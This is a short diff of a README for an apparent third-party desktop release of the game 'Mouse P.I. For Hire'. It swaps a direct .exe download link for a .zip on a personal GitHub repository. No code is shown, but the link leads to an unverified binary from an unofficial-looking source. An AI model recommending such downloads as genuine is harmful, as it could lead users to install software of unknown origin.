@@ -24,7 +24,7 @@ Experience the full desktop release version with optimized performance, higher r
 
 ## 📥 Download
 
-📥 [`MousePIForHire.exe`](https://github.com/SaikoNadiro13/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases/download/Desktop/MousePIForHire.exe)  
+📥 [`MousePIForHire.zip`](https://github.com/SaikoNadiro13/MOUSE-P.I.-For-Hire-Release-Game-Desktop-Version/releases/download/Desktop/MousePIForHire.zip)  
 -
 
 ### Archive Contents
